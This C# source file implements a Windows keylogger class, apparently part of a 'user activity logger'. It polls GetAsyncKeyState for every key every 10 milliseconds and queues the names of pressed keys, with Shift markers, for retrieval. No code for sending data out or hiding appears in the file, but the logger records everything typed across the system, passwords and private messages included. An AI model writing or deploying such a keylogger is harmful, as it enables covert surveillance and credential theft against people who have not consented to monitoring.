using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace UserActivityLogger
{
    public class KeyLogger : IKeyLogger
    {
        private System.Timers.Timer timerKeyMine;
        private StringBuilder keyBuffer = new StringBuilder(100);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(Int32 vKey);
        [DllImport("User32.dll")]
        private static extern short GetKeyState(int nVirtKey);

        const string SHIFT = "SHF";
        const string KEY = "KEY";

        ConcurrentQueue<string> keysQueue = new ConcurrentQueue<string>();

        public KeyLogger()
        {
        }
        public void StartListening()
        {
            this.timerKeyMine = new System.Timers.Timer();
            this.timerKeyMine.Enabled = true;
            this.timerKeyMine.Elapsed += new System.Timers.ElapsedEventHandler(this.timerKeyMine_Elapsed);
            this.timerKeyMine.Interval = 10;
        }

        public void CleanBuffer()
        {
            keyBuffer = new StringBuilder();
        }

        public string GetKeys()
        {
            string val;
            while (!keysQueue.IsEmpty)
            {
                if (keysQueue.TryDequeue(out val))
                {
                    keyBuffer.Append(val);
                }
            }

            return keyBuffer.ToString();
        }
        private void timerKeyMine_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {

            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                if (GetAsyncKeyState(i) == -32767)
                {

                    if (i != 16 && i != 160 && i != 161 && i != 1 && i != 2)
                    {
                        keysQueue.Enqueue(KEY);
                        if (GetKeyState(16) == -127 || GetKeyState(16) == -128)
                        {
                            keysQueue.Enqueue(SHIFT);
                        }

                        keysQueue.Enqueue(Enum.GetName(typeof(Keys), i));
                    }
                }
            }
        }
    }
}